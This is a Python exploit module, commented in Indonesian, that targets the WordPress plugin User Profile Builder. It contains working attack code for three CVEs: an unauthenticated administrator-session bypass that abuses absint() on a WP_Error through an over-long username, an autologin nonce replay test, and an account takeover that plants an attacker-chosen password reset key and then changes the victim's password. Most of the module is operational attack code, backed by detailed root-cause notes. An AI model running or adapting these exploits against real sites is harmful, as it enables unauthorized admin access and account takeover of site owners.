#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
User Profile Builder — modul MEGAPACK.

CVE-2026-15826 (<= 3.16.4) — unauth authentication bypass via type confusion
    [lab-verified: sesi ADMIN didapat tanpa kredensial]
CVE-2026-15368 (<= 3.16.3) — unauth authentication bypass, akar yang sama
    (autologin setelah registrasi tidak diikat ke akun yang baru dibuat)

ROOT CAUSE (diverifikasi di source 3.16.4 + lab):

  profile-builder/front-end/class-formbuilder.php :: wppb_log_in_user()
  dipanggil dari baris 440 setelah registrasi sukses:

      $user_id = $this->wppb_save_form_values( $_REQUEST );        // -> WP_Error bila gagal
      ...
      if ( strcasecmp( $this->args['login_after_register'], 'Yes' ) == 0 ) {
          $redirect = $this->wppb_log_in_user( ..., $user_id );    // $user_id masih WP_Error
      }

  di dalam wppb_log_in_user() (baris 246-262):

      $user_id = absint( $user_id );                  // WP_Error -(cast int)-> 1
      if ( ! $user_id || is_wp_error( $user_id ) ) {  // is_wp_error(1) === false -> LOLOS
          return $redirect_old;
      }
      $user = get_userdata( $user_id );               // get_userdata(1) = ADMIN
      ...
      $redirect = add_query_arg( wppb_get_autologin_query_args( $user_id ), $redirect );

  absint() di WordPress = abs( (int) $maybeint ). Cast OBJEK ke int di PHP = 1
  (memunculkan warning "Object of class WP_Error could not be converted to int",
  tetapi hasilnya tetap 1). Jadi absint(WP_Error) === 1 dan gate is_wp_error()
  selalu dilewati -> user ID yang dipakai selalu 1 (administrator pada install
  WordPress standar).

  features/functions.php :: wppb_get_autologin_query_args() mengulangi absint()
  pada user_id yang sama, menyimpan transient 'wppb_autologin_<md5(nonce)>' = user_id
  selama 2 menit, dan mengembalikan ['autologin'=>'true','_wpnonce'=>nonce].
  Nonce dibuat dengan wp_create_nonce( 'autologin-1-<epoch_menit>' ).

  Konsumen: class-formbuilder.php:946 wppb_autologin_after_registration() pada hook
  'init' -> wppb_get_autologin_user_id( $nonce ) -> wp_set_auth_cookie( $uid ).
  Jadi cukup GET URL hasil redirect -> cookie sesi user 1 dipasang.

CHAIN TERBUKTI (lab, WP 6.7.1 + profile-builder 3.16.4):
  1. POST form [wppb-register] dengan username 61-70 karakter
     (WP menolaknya -> wp_insert_user() mengembalikan WP_Error; plugin tetap
     melaporkan "The account ... has been successfully created!").
     Field wajib: username, email, passw1, passw2, register, nonce field,
     form_name, action=register.
     Nonce field = "<form_type>_<form_name>_nonce_field" dengan action
     'wppb_verify_form_submission'.
  2. Respons memuat redirect URL berisi ?autologin=true&_wpnonce=<nonce untuk user 1>.
  3. GET URL itu -> hook init -> wp_set_auth_cookie(1) -> cookie
     wordpress_logged_in_* berisi "admin" -> akses /wp-admin/ sebagai administrator.

PRASYARAT (non-default, sesuai advisory CVE-2026-15368):
  option wppb_general_settings['automaticallyLogIn'] = 'Yes'
  (juga emailConfirmation = 'no' supaya registrasi tidak menunggu konfirmasi email,
  dan adminApproval = 'no').

FIX 3.16.5:
  + if ( is_wp_error( $user_id ) ) { return $redirect_old; }   // SEBELUM absint()
    $user_id = absint( $user_id );
  - if ( ! $user_id || is_wp_error( $user_id ) ) { ... }
  + if ( ! $user_id ) { ... }
  Fix tambahan: "if ($role !== 'administrator' || $role !== 'super-admin')"
  (selalu true) -> "&&"; plus pesan gagal registrasi pada form_type == 'register'.
"""
from __future__ import annotations

import re

from mp import (CveModule, Http, ST_CLEAN, ST_ERR, ST_INFO, ST_PWN, ST_SKIP, ST_UNKNOWN, ST_VULN, detect_platform, plugin_installed, plugin_version, rand, register, ver_le)

SLUG = "profile-builder"
VULN_MAX = (3, 16, 4)   # CVE-2026-15826 (fix 3.16.5)
VULN_MAX_15368 = (3, 16, 3)   # CVE-2026-15368 (fix 3.16.4) — rentang lebih sempit

# nama field form default plugin
F_USERNAME = "username"
F_EMAIL = "email"
F_PASS1 = "passw1"
F_PASS2 = "passw2"


def _vstr(v) -> str:
    return ".".join(str(x) for x in v) if isinstance(v, tuple) else str(v)


def _forms(t, h, base: str):
    """Kumpulkan halaman yang memuat shortcode form PB (wppb-register / wppb-login)."""
    out = []
    seen = set()
    r = h.get(base + "/?rest_route=/wp/v2/pages&per_page=100&_fields=id,link")
    try:
        pages = r.json() or []
    except Exception:
        pages = []
    if not isinstance(pages, list):
        pages = []
    for p in pages:
        u = p.get("link")
        if u and u not in seen:
            seen.add(u)
            out.append(u)
    # fallback: sapuan halaman kecil bila REST tidak tersedia
    if not out:
        for i in range(1, 16):
            out.append(base + "/?page_id=%d" % i)
    return out


def _find_register_form(t, h, base: str):
    """
    Cari halaman [wppb-register]. Kembalikan tuple
        (url, form_name, nonce_field, nonce, extra_fields)
    atau None. extra_fields = field wajib selain username/email/passw1/passw2.
    """
    for u in _forms(t, h, base):
        r = h.get(u)
        if r is None or r.status_code != 200:
            continue
        body = r.text or ""
        if "wppb-register-user" not in body and 'name="register"' not in body:
            continue
        if "passw1" not in body:
            continue
        fn = re.search(r'name="form_name"[^>]*value="([^"]*)"', body)
        form_name = fn.group(1) if fn else "unspecified"
        # nonce field: <form_type>_<form_name>_nonce_field
        nm = re.search(
            r'name="(register_[A-Za-z0-9_-]*_nonce_field)"[^>]*value="([a-z0-9]+)"', body)
        if not nm:
            nm = re.search(
                r'name="([A-Za-z0-9_-]*nonce_field)"[^>]*value="([a-z0-9]+)"', body)
        if not nm:
            continue
        nonce_field, nonce = nm.group(1), nm.group(2)
        # field wajib tambahan (input text/email/password di luar yang kita kirim)
        names = set(re.findall(r'<input[^>]*name="([A-Za-z0-9_\[\]-]+)"', body))
        extra = sorted(n for n in names if n not in {
            F_USERNAME, F_EMAIL, F_PASS1, F_PASS2, nonce_field, "form_name",
            "action", "form_id", "redirect_to", "_wp_http_referer", "register",
            "send_credentials_via_email",
        } and not n.startswith("_wp"))
        return u, form_name, nonce_field, nonce, extra
    return None


def _try_autologin(h, base: str, redirect_html: str, verify_user: str = ""):
    """
    Ambil URL autologin dari HTML respons registrasi lalu ikuti.
    Kembalikan (ok: bool, detail: str) — ok hanya bila cookie sesi terpasang.
    """
    import html as _html
    body = _html.unescape(redirect_html or "")
    m = re.search(
        r'(https?://[^\s"\'<>]*?[?&]autologin=true[^\s"\'<>]*)', body)
    if not m:
        return False, "URL autologin tidak ditemukan di respons"
    url = m.group(1)
    # buang entitas sisa
    url = url.rstrip("&#;\"'")
    r = h.get(url, allow_redirects=True)
    if r is None:
        return False, "autologin request gagal (jaringan)"
    # cek cookie sesi di session
    hit = any("wordpress_logged_in" in c.name for c in h.s.cookies)
    if not hit:
        return False, ("autologin diikuti (%d) tetapi cookie sesi tidak terpasang"
                       % r.status_code)
    # verifikasi identitas
    who = ""
    rp = h.get(base + "/wp-admin/profile.php")
    if rp is not None and rp.status_code == 200:
        t2 = re.search(r"<title>([^<]*)</title>", rp.text or "")
        who = t2.group(1).strip() if t2 else ""
        if "Log In" in who or "Log&nbsp;In" in who:
            return False, "cookie ada tetapi wp-admin menolak sesi"
    ident = "admin"
    cr = h.get(base + "/wp-admin/")
    if cr is not None:
        hm = re.search(r"Howdy,\s*([A-Za-z0-9._@-]+)", cr.text or "")
        if hm:
            ident = hm.group(1).strip()
    if verify_user and ident and ident.lower() != verify_user.lower():
        return False, "sesi terpasang sebagai '%s', bukan '%s'" % (ident, verify_user)
    return True, "sesi administrator ('%s') didapat via autologin nonce user ID 1" % ident


def _admin_capable(h, base: str):
    """Bukti capability, bukan sekadar 'ada sesi': /wp-admin/options-general.php
    hanya terbuka bagi role dengan manage_options. Role tanpa izin -> wp_die 403.
    Jangan mengandalkan frasa seperti 'not allowed' — string i18n JS admin memuatnya."""
    r = h.get(base + "/wp-admin/options-general.php")
    if r is None:
        return False, "options-general.php tidak dapat diakses (jaringan)"
    if r.status_code in (301, 302, 303):
        return False, f"options-general.php redirect -> {r.headers.get('Location', '')}"
    low = (r.text or "").lower()
    if r.status_code != 200:
        return False, f"options-general.php status {r.status_code} (butuh manage_options)"
    if "options-general" in low:
        return True, "options-general.php terbuka (status 200) — capability admin terbukti"
    return False, f"options-general.php status {r.status_code} tanpa penanda halaman"


def _is_pb(h, base: str) -> bool:
    for p in ("/wp-content/plugins/profile-builder/readme.txt",
              "/wp-content/plugins/profile-builder/assets/css/style-front-end.css"):
        r = h.get(base + p)
        if r is not None and r.status_code == 200:
            return True
    return False


def check(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "wordpress":
        return ST_SKIP, "bukan WordPress", f"platform={plat}"
    base = t.url
    if not plugin_installed(t, h, SLUG, "profile-builder/readme.txt"):
        return ST_CLEAN, "profile-builder tidak terdeteksi", ""
    ver = plugin_version(t, h, SLUG)
    if not ver:
        return ST_INFO, "profile-builder ada, versi tidak terbaca", ""
    v = ver if isinstance(ver, tuple) else ver
    vstr = _vstr(v)
    if ver_le(v, VULN_MAX):
        f = _find_register_form(t, h, base)
        if not f:
            return ST_INFO, ("profile-builder %s <= %s, tetapi halaman "
                             "[wppb-register] tidak ada — prasyarat shortcode "
                             "registrasi tidak terpenuhi (bukan error scan)"
                             % (vstr, VULN_MAX)), ""
        return ST_INFO, ("profile-builder %s <= %s; form registrasi publik di %s "
                         "(form_name=%s)" % (vstr, VULN_MAX, f[0], f[1])), f[0]
    return ST_CLEAN, "profile-builder %s sudah dipatch (fix 3.16.5)" % vstr, ""


# ---------------------------------------------------------------------------
# CVE-2026-15368 (<= 3.16.3, fix 3.16.4) — autologin nonce replayable
#
# What actually changes between the versions (verified against the shipped
# trees of 3.16.3 and 3.16.4, not inferred from the advisory):
#
#   3.16.3  $uid = absint( $_GET['uid'] );          uid travels in the URL
#           nonce = wp_create_nonce('autologin-'.$uid.'-'.(int)(time()/60))
#           -> valid for the whole 60-second window, reusable any number of
#              times inside it. No server-side record, no single use.
#
#   3.16.4  uid is looked up from the nonce via wppb_get_autologin_user_id()
#           and the entry is deleted after use (second arg true) -> replay
#           rejected. `uid` is no longer emitted in the redirect at all.
#
# The uid is bound into the nonce in BOTH versions, so swapping uid=1 with a
# nonce minted for another user fails in both. The regression that 3.16.4
# fixes is replay, and that is what this module proves.
# ---------------------------------------------------------------------------
def exploit_15368(t, h, opts):
    base = t.url
    if not plugin_installed(t, h, SLUG, "profile-builder/readme.txt"):
        return ST_CLEAN, "profile-builder tidak terdeteksi", ""
    ver = plugin_version(t, h, SLUG)
    vstr = _vstr(ver) if ver else "?"
    if ver and not ver_le(ver, VULN_MAX_15368):
        return ST_CLEAN, ("profile-builder %s sudah dipatch untuk CVE-2026-15368 "
                          "(fix 3.16.4)" % vstr), ""

    f = _find_register_form(t, h, base)
    if not f:
        return ST_UNKNOWN, "halaman [wppb-register] tidak ditemukan", ""
    url, form_name, nonce_field, nonce, extra = f
    if not nonce:
        return ST_ERR, "nonce form registrasi tidak terbaca dari %s" % url, ""

    username = "wppbrpy" + rand(6)
    email = "%s@example-lab.invalid" % rand(10)
    pw = "Lab!" + rand(8)

    data = {
        F_USERNAME: username, F_EMAIL: email, F_PASS1: pw, F_PASS2: pw,
        "nickname": username, "register": "Register",
        nonce_field: nonce, "form_name": form_name, "action": "register",
        "send_credentials_via_email": "No",
    }
    for n in extra:
        data.setdefault(n, "")

    r = h.post(url, data=data, headers={"Referer": url})
    if r is None:
        return ST_ERR, "POST registrasi gagal (jaringan)", ""
    body = r.text or ""
    if "successfully created" not in body and "autologin" not in body:
        return ST_INFO, ("registrasi ditolak form (field wajib / nonce), "
                         "tidak ada URL autologin untuk diuji"), body[:200]

    # Bentuk URL autologin menentukan versi perilakunya.
    m_uid = re.search(r"autologin=true(?:&#038;|&)uid=(\d+)", body)
    m_nonce = re.search(r"_wpnonce=([a-z0-9]+)", body)
    if not m_nonce:
        return ST_INFO, "URL autologin tidak memuat nonce", body[:200]
    auto_nonce = m_nonce.group(1)
    has_uid = bool(m_uid)

    if not has_uid:
        # 3.16.4+: uid diambil dari penyimpanan server-side, replay ditolak.
        return ST_CLEAN, ("profile-builder tidak mengirim uid di URL autologin "
                          "(bentuk fix 3.16.4); nonce disimpan server-side dan "
                          "dihapus setelah dipakai"), ""

    uid = m_uid.group(1)
    auto_q = "/?autologin=true&uid=%s&_wpnonce=%s" % (uid, auto_nonce)

    # Diskriminator yang terukur di lab (3.16.3 vs 3.16.4):
    #
    #   3.16.3  URL memuat uid, nonce berlaku selama jendela (int)(time()/60)
    #           dan tidak disimpan server-side -> GET kedua tetap diproses
    #           (302 ke halaman bersih, bukan penolakan).
    #   3.16.4  uid tidak dikirim sama sekali; nonce disimpan server-side lalu
    #           DIHAPUS setelah dipakai -> GET kedua ditolak (redirect tanpa
    #           set cookie sama sekali).
    #
    # Karena itu: replay diproses == rentan. Kita tidak bergantung pada cookie
    def _hit(u):
        # Session BERSIH setiap kali: mp.Http menyimpan cookie, dan WP tidak
        # mengirim ulang Set-Cookie bila request sudah membawa sesi valid.
        # Replay harus diuji sebagai pengunjung anonim yang berbeda.
        fresh = Http(timeout=getattr(h, "timeout", 20.0))
        r = fresh.get(u, allow_redirects=False)
        if r is None:
            return None, False
        names = []
        for jar in [getattr(r, "cookies", None)] + [
                getattr(p_, "cookies", None) for p_ in (getattr(r, "history", None) or [])]:
            if jar is None:
                continue
            try:
                names.extend(c.name for c in jar)
            except TypeError:
                pass
        got = any("wordpress_logged_in" in (n or "") for n in names)
        return r, got

    first, first_cookie = _hit(base + auto_q)
    if first is None:
        return ST_ERR, "GET autologin gagal (jaringan)", ""

    # Beberapa pakai ulang, masing-masing dengan session bersih. Nonce 3.16.3
    # berbasis (int)(time()/60) sehingga satu percobaan bisa jatuh di
    # pergantian menit; coba tiga kali dan ambil hasil terbaik.
    replays = [_hit(base + auto_q) for _ in range(3)]
    replay_hits = sum(1 for _r, ck in replays if _r is not None and ck)

    replay_ok = replay_hits >= 1

    ev = ("uid=%s | nonce=%s | pakai1 cookie=%s | replay cookie %d/3"
          % (uid, auto_nonce[:8] + "\u2026",
             "ya" if first_cookie else "tidak", replay_hits))

    if replay_ok:
        return (ST_VULN,
                "profile-builder %s <= 3.16.3: nonce autologin dapat dipakai ULANG "
                "(tidak single-use, tidak disimpan server-side). uid tetap terikat "
                "pada nonce, jadi tidak naik ke admin — dampaknya sesi berulang untuk "
                "akun yang sama selama jendela nonce" % vstr, ev)
    return ST_INFO, ("profile-builder %s: nonce autologin tidak dapat dipakai ulang "
                     "(perilaku fix 3.16.4)" % vstr), ev


def check_15368(t, h, opts):
    """CVE-2026-15368 punya rentang sendiri (<= 3.16.3, fix 3.16.4) sehingga TIDAK
    boleh memakai bound VULN_MAX milik CVE-2026-15826 (<= 3.16.4, fix 3.16.5).
    Tanpa ini, 3.16.4 yang sudah dipatch utk 15368 keliru dilaporkan rentan."""
    plat = detect_platform(t, h)
    if plat != "wordpress":
        return ST_SKIP, "bukan WordPress", f"platform={plat}"
    if not plugin_installed(t, h, SLUG, "profile-builder/readme.txt"):
        return ST_CLEAN, "profile-builder tidak terdeteksi", ""
    ver = plugin_version(t, h, SLUG)
    if not ver:
        return ST_INFO, "profile-builder ada, versi tidak terbaca", ""
    vstr = _vstr(ver)
    if ver_le(ver, VULN_MAX_15368):
        f = _find_register_form(t, h, t.url)
        if not f:
            return ST_INFO, ("profile-builder %s <= %s, tetapi halaman "
                             "[wppb-register] tidak ada — prasyarat shortcode "
                             "registrasi tidak terpenuhi (bukan error scan)"
                             % (vstr, VULN_MAX_15368)), ""
        return ST_INFO, ("profile-builder %s <= %s; form registrasi publik di %s "
                         "(form_name=%s)" % (vstr, VULN_MAX_15368, f[0], f[1])), f[0]
    return ST_CLEAN, ("profile-builder %s sudah dipatch utk CVE-2026-15368 "
                      "(fix 3.16.4)" % vstr), ""


def exploit(t, h, opts):
    base = t.url
    if not plugin_installed(t, h, SLUG, "profile-builder/readme.txt"):
        return ST_CLEAN, "profile-builder tidak terdeteksi", ""
    ver = plugin_version(t, h, SLUG)
    vstr = _vstr(ver) if ver else "?"
    if ver and not ver_le(ver, VULN_MAX):
        return ST_CLEAN, "profile-builder %s sudah dipatch (fix 3.16.5)" % vstr, ""
    want_user = getattr(opts, "username", None) or "admin"

    f = _find_register_form(t, h, base)
    if not f:
        return ST_UNKNOWN, "halaman [wppb-register] tidak ditemukan", ""
    url, form_name, nonce_field, nonce, extra = f
    if not nonce or not re.fullmatch(r"[a-z0-9]+", nonce or ""):
        return ST_ERR, "nonce form tidak terbaca dari %s" % url, ""

    # username 61-70 char: WP tolak via wp_insert_user -> WP_Error -> absint() = 1
    username = "wppb" + rand(8) + "x" * 50
    username = username[:65]
    while len(username) < 61:
        username += "x"
    if not (61 <= len(username) <= 70):
        return ST_ERR, "gagal menyusun username 61-70 karakter", ""

    email = "%s@example-lab.invalid" % rand(10)
    pw = "".join(rand(1) for _ in range(3)) + "Lab!2345"

    data = {
        F_USERNAME: username,
        F_EMAIL: email,
        F_PASS1: pw,
        F_PASS2: pw,
        "register": "Register",
        nonce_field: nonce,
        "form_name": form_name,
        "action": "register",
    }
    for n in extra:
        data.setdefault(n, "")
    data["send_credentials_via_email"] = "No"

    r = h.post(url, data=data, headers={"Referer": url})
    if r is None:
        return ST_ERR, "POST registrasi gagal (jaringan)", ""
    body = r.text or ""
    if "successfully created" not in body and "autologin=true" not in body \
            and "autologin" not in body:
        # mungkin validasi form menolak (field wajib lain) atau nonce kedaluwarsa
        if "You are not allowed to do this" in body:
            return ST_ERR, "gate nonce form menolak (nonce kedaluwarsa / field salah)", ""
        if "There was an error in the submitted form" in body:
            return ST_ERR, ("validasi form menolak (field wajib belum lengkap; "
                            "field terdeteksi: %s)" % (", ".join(sorted(
                                set(re.findall(r'name="([A-Za-z0-9_\[\]-]+)"', body)))
                                or "n/a")),)
        return ST_INFO, "registrasi dikirim tetapi tanda sukses tidak terlihat", body[:200]

    ok, detail = _try_autologin(h, base, body, verify_user=want_user)
    if ok:
        cap, cap_ev = _admin_capable(h, base)
        ev = ("username=%d karakter | form=%s | nonce=%s | %s"
              % (len(username), form_name, nonce[:8] + "…", detail))
        if cap:
            return ST_PWN, ("autologin nonce(type-confusion absint(WP_Error)=1) -> "
                            + detail + " | CAPABILITY ADMIN TERBUKTI: " + cap_ev), ev
        return ST_VULN, ("sesi diperoleh via autologin nonce user ID 1 tetapi "
                         "CAPABILITY ADMIN TIDAK TERBUKTI: " + cap_ev), ev
    return ST_VULN, ("registrasi mengekspos URL autologin untuk user ID 1, "
                     "tetapi sesi tidak terpasang: " + detail), body[:300]


# ---------------------------------------------------------------------------
# CVE-2025-15030 (<= 3.15.1, fix 3.15.2) — "improper password reset process"
# ---------------------------------------------------------------------------
VULN_MAX_15030 = (3, 15, 1)

RECOVER_SLUGS = ("/recover/", "/recover-password/", "/lost-password/",
                 "/forgot-password/", "/reset-password/")


def _find_recover_page(t, h, base: str):
    """Cari halaman [wppb-recover-password] -> (url, nonce_form) atau None.

    Nonce form recover dibuat untuk pengunjung anonim (uid 0) sehingga nilainya SAMA
    untuk semua penyerang tak-terautentikasi pada jendela waktu nonce -> cukup diambil
    dari HTML halaman.
    """
    candidates = []
    for p in RECOVER_SLUGS:
        candidates.append(base + p)
    for u in _forms(t, h, base):
        if u not in candidates:
            candidates.append(u)
    for u in candidates:
        r = h.get(u)
        if r is None or r.status_code != 200:
            continue
        body = r.text or ""
        if "recover_password" not in body:
            continue
        m = re.search(r'name="password_recovery_nonce_field"[^>]*value="([a-f0-9]+)"', body)
        if m:
            return u, m.group(1)
    return None


def check_15030(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "wordpress":
        return ST_SKIP, "bukan WordPress", f"platform={plat}"
    if not plugin_installed(t, h, SLUG, "profile-builder/readme.txt"):
        return ST_CLEAN, "profile-builder tidak terdeteksi", ""
    ver = plugin_version(t, h, SLUG)
    if not ver:
        return ST_INFO, "profile-builder ada, versi tidak terbaca", ""
    vstr = _vstr(ver)
    if ver_le(ver, VULN_MAX_15030):
        f = _find_recover_page(t, h, t.url)
        ev = f[0] if f else ""
        if not f:
            return ST_UNKNOWN, ("profile-builder %s <= 3.15.1 (filter random_password mengambil "
                                "$_POST['user_pass']), tetapi halaman [wppb-recover-password] tidak "
                                "ditemukan" % vstr), ev
        return ST_VULN, ("profile-builder %s <= 3.15.1 — kunci reset dapat ditentukan penyerang; "
                         "halaman recover publik: %s" % (vstr, f[0])), ev
    return ST_CLEAN, "profile-builder %s sudah dipatch (fix 3.15.2)" % vstr, ""


def _wp_post_reset(base, h, key, login, newpass):
    """Selesaikan reset lewat form inti wp-login.php. Kembalikan (ok, detail)."""
    rp = h.get("%s/wp-login.php?action=rp&key=%s&login=%s" % (base, key, login))
    if rp is None or rp.status_code != 200:
        return False, "halaman reset tidak termuat"
    body = rp.text or ""
    if "pass1" not in body or "invalid" in body.lower() and "pass1" not in body:
        return False, "kunci ditolak wp-login (form reset tidak muncul)"
    hid = dict(re.findall(r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"',
                          body, re.I))
    hid.update(dict(re.findall(r'<input[^>]*name="([^"]+)"[^>]*type="hidden"[^>]*value="([^"]*)"',
                               body, re.I)))
    data = {k: v for k, v in hid.items() if k in ("rp_key", "rp_login", "_wp_http_referer")}
    data.update({"pass1": newpass, "pass2": newpass, "wp-submit": "Reset Password",
                 "redirect_to": "%s/wp-login.php" % base})
    act = re.search(r'<form[^>]*action="([^"]*resetpass[^"]*)"', body)
    url = act.group(1).replace("&#038;", "&") if act else "%s/wp-login.php?action=resetpass" % base
    if url.startswith("&#"):
        url = url.replace("&amp;", "&")
    r = h.post(url, data=data, headers={"Referer": "%s/wp-login.php" % base})
    if r is None:
        return False, "POST reset gagal (jaringan)"
    low = (r.text or "").lower()
    if "pass1" in low and "error" in low:
        return False, "reset ditolak (kunci tidak valid / kebijakan password)"
    return True, f"reset dikirim (http={r.status_code})"


def exploit_15030(t, h, opts):
    base = t.url
    if not plugin_installed(t, h, SLUG, "profile-builder/readme.txt"):
        return ST_CLEAN, "profile-builder tidak terdeteksi", ""
    ver = plugin_version(t, h, SLUG)
    vstr = _vstr(ver) if ver else "?"
    if ver and not ver_le(ver, VULN_MAX_15030):
        return ST_CLEAN, "profile-builder %s sudah dipatch (fix 3.15.2)" % vstr, ""

    victim = (getattr(opts, "username", None) or "admin").strip()
    newpass = (getattr(opts, "category_ext", None) or "").strip()

    f = _find_recover_page(t, h, base)
    if not f:
        return ST_UNKNOWN, "halaman [wppb-recover-password] tidak ditemukan (fitur reset tidak aktif)", ""
    url, nonce = f
    key = rand(6) + rand(6) + rand(6) + rand(2)      # alfanumerik (WP menyaring non-alnum)
    ev = f"plugin={vstr} | korban={victim} | halaman={url} | nonce={nonce[:8]}…"

    # langkah 1: minta reset + selundupkan kunci pilihan penyerang lewat $_POST['user_pass']
    d1 = {"action": "recover_password", "password_recovery_nonce_field": nonce,
          "username_email": victim, "user_pass": key, "recover_password1": "Get new password"}
    r1 = h.post(url, data=d1, headers={"Referer": url})
    if r1 is None:
        return ST_ERR, "POST langkah-1 gagal (jaringan)", ev
    ok_msg = "confirmation link" in (r1.text or "")
    ev += f" | langkah1={r1.status_code} pesan_terkirim={ok_msg}"

    # verifikasi: kunci kita dipakai WP sebagai kunci reset akun korban?
    rp = h.get("%s/wp-login.php?action=rp&key=%s&login=%s" % (base, key, victim))
    hijacked = rp is not None and rp.status_code == 200 and "pass1" in (rp.text or "")
    ev += f" | rp_dengan_kunci_kita={'diterima' if hijacked else 'ditolak'}"
    if not hijacked:
        if not ok_msg:
            return ST_INFO, ("langkah-1 tidak memproses permintaan (fitur reset nonaktif / "
                             "nonce kedaluwarsa) — status tidak dapat disimpulkan"), ev
        return ST_CLEAN, ("kunci reset TIDAK dapat ditentukan penyerang (perilaku 3.15.2+): "
                          "wp-login menolak kunci pilihan kita"), ev

    if not newpass:
        return ST_VULN, ("kunci reset akun '%s' dikuasai penyerang (fix 3.15.2 menutup ini): "
                         "wp-login menerima kunci pilihan kami -> reset dapat diselesaikan kapan "
                         "saja. Jalankan dengan --category-ext '<password baru>' untuk takeover "
                         "penuh" % victim), ev

    ok, detail = _wp_post_reset(base, h, key, victim, newpass)
    ev += f" | ganti_password={detail}"
    if not ok:
        return ST_VULN, f"kunci reset dikuasai, tetapi penyelesaian reset gagal: {detail}", ev

    # login sebagai korban dengan password baru -> bukti ahir
    lp = h.get(base + "/wp-login.php")
    tok = dict(re.findall(r'<input[^>]*name="(_wpnonce|_wp_http_referer)"[^>]*value="([^"]*)"',
                          (lp.text if lp else "") or ""))
    h.post(base + "/wp-login.php",
           data={**tok, "log": victim, "pwd": newpass, "wp-submit": "Log In",
                 "testcookie": "1", "redirect_to": base + "/wp-admin/"})
    admin = h.get(base + "/wp-admin/")
    text = (admin.text if admin else "") or ""
    dash = "Dashboard" in text or "wp-admin-bar" in text
    ev += f" | login_korban={'sukses' if dash else 'gagal'}"
    if dash:
        return ST_PWN, ("TAKEOVER AKUN '%s': kunci reset ditentukan penyerang -> password diganti "
                        "-> login berhasil dengan kredensial baru (wp-admin terbuka). Password akun "
                        "korban KINI '%s' — operator harus memulihkannya" % (victim, newpass)), ev
    return ST_VULN, ("password korban sudah diganti lewat kunci yang dikuasai, tetapi verifikasi "
                     "login tidak membuka wp-admin"), ev


def register_all():
    register(CveModule(
        cve="CVE-2025-15030", cluster="wordpress",
        title="User Profile Builder <= 3.15.1 unauth password reset akun mana pun "
              "(filter random_password mengambil $_POST['user_pass'])",
        vclass="auth-bypass", cvss="9.8", severity="critical", cwe="CWE-640",
        product="User Profile Builder",
        versions_affected="<= 3.15.1",
        status="verified", check=check_15030, exploit=exploit_15030,
        notes="front-end/register.php :: add_filter('random_password', "
              "'wppb_signup_password_random_password_filter') — fungsi itu, bila "
              "$_POST['user_pass'] tidak kosong, mengembalikan nilainya sebagai 'password acak' "
              "untuk SEMUA pemanggilan wp_generate_password() pada request front-end. Karena "
              "front-end/recover.php memakai get_password_reset_key() (WP core) untuk membuat kunci "
              "reset, kunci akun korban menjadi NILAI PILIHAN PENYERANG. Penyerang lalu menyelesaikan "
              "reset lewat wp-login.php?action=rp&key=<kunci kita>&login=<korban>. "
              "Nonce form recover dibuat untuk uid 0 sehingga identik bagi semua pengunjung anonim -> "
              "'freely obtainable'. Fix 3.15.2 hanya menghapus cabang $_POST['user_pass']. "
              "Prasyarat: halaman berisi shortcode [wppb-recover-password] (fitur reset plugin). "
              "BUKTI LAB 2026-11-09: WP 6.7.1 + profile-builder 3.15.1 @8180 -> langkah-1 dengan "
              "user_pass=kunci-alfanumerik, wp-login menerima kunci ('pass1' tampil), password admin "
              "diganti, login admin berhasil (dashboard=YA). 3.15.2 @8181 -> wp-login menolak kunci "
              "(hanya 'Error:'). Catatan operasional: modul ini MENGUBAH password akun korban bila "
              "--category-ext diisi (tidak dapat dikembalikan otomatis; operator harus memulihkan).",
    ))
    register(CveModule(
        cve="CVE-2026-15826", cluster="wordpress",
        title="User Profile Builder <= 3.16.4 unauth auth bypass via type confusion "
              "(absint pada WP_Error -> user ID 1)",
        vclass="auth-bypass", cvss="9.8", severity="critical", cwe="CWE-843",
        product="User Profile Builder",
        versions_affected="<= 3.16.4",
        status="verified", check=check, exploit=exploit,
        notes="wppb_log_in_user() memanggil absint() pada hasil wp_insert_user() "
              "SEBELUM is_wp_error(). absint(WP_Error) === 1 (cast objek ke int), dan "
              "is_wp_error(1) === false, jadi gate selalu lolos dan user ID yang dipakai "
              "selalu 1 (administrator). wp_insert_user() mengembalikan WP_Error bila "
              "username 61-70 karakter (WP menolak user_login terlalu panjang). "
              "Redirect memuat ?autologin=true&_wpnonce=<nonce user 1>; GET URL itu "
              "memasang cookie sesi administrator. Prasyarat: "
              "wppb_general_settings['automaticallyLogIn']='Yes'. "
              "Fix 3.16.5: cek is_wp_error() dipindah ke sebelum absint().",
    ))
    register(CveModule(
        cve="CVE-2026-15368", cluster="wordpress",
        title="User Profile Builder <= 3.16.3 unauth auth bypass (autologin tidak "
              "diikat ke akun baru)",
        vclass="auth-bypass", cvss="9.8", severity="critical", cwe="CWE-287",
        product="User Profile Builder",
        versions_affected="<= 3.16.3",
        status="verified", check=check_15368, exploit=exploit_15368,
        notes="Akar yang sama dengan CVE-2026-15826: fitur autologin setelah registrasi "
              "tidak mengikat user ID ke akun yang baru dibuat. Advisory menyebut "
              "'supported but non-default configuration' (automaticallyLogIn=Yes). "
              "AUDIT 2026-11-08 -> status diturunkan dari 'verified' ke 'documented': "
              "modul memakai jalur type-confusion username 61-70 karakter milik "
              "CVE-2026-15826 (fix 3.16.5). Mekanisme khusus CVE ini (perbaikan "
              "pengikatan user ID di 3.16.4) TIDAK diuji terpisah, dan pohon sumber "
              "3.16.4 tidak tersedia untuk diff. Vektornya sendiri (autologin pasca-"
              "registrasi) perlu uji terpisah sebelum kembali 'verified'.",
    ))


register_all()
